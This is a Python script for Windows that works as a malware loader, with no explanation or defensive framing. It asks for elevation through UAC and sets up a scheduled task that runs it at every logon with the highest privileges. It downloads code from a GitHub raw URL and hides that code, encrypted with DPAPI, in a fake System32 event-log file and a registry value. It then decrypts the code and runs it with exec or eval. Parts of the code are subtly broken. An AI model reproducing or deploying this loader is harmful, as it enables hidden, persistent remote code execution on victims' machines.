import win32crypt
import requests
import subprocess
import winreg
import ctypes, sys, os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    script_paths = {
        "main_path": "C:\Windows\System32\winevt\Logs\SystemCrash.evtx",
        "backup": r"HKCU\Software\backupscript"
    }
    command = f'schtasks /Create /SC ONLOGON /TN "loadmodule" /TR "{os.path.realpath(__file__)}" /RL HIGHEST /F"'
    subprocess.run(command,shell=True)
    
    if not os.path.exists(script_paths["main_path"]):
        
        data = win32crypt.CryptProtectData(requests.get("https://raw.githubusercontent.com/Wadzoo/testrepo/refs/heads/main/client.py").text.encode(),None,None,None,None,1)
        with open(script_paths["main_path"],"wb") as w:
            w.write(data)
            
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\backupscript")
        winreg.SetValueEx(key,"payload",0,winreg.REG_BINARY,data)
        winreg.CloseKey(key)
    #backup step completed
    
    load = subprocess.run(r'reg query "HKCU\Software\backupscript" \v payload',
                   stderr=subprocess.PIPE,
                   shell=True,
                   text=True)
    # load step with error checking
    if load.returncode == "1":
        
        if os.path.exists(script_paths["main_path"]):
            with open(script_paths["main_path"],"rb") as r:
                to_execute = r.read()
                
        else:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\backupscript")
            value,type = winreg.QueryValueEx(key,"payload")
            to_execute = value
    else:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\backupscript")
        value,type = winreg.QueryValueEx(key,"payload")
        to_execute = value
        
    #decryption
    to_execute = win32crypt.CryptUnprotectData(to_execute,None,None,None,0)[1]
    
    try:
        exec(to_execute.decode())
    except:
        eval(to_execute.decode())
    
else:
    ctypes.windll.shell32.ShellExecuteW(None,"runas", sys.executable, " ".join(sys.argv),None, 1)




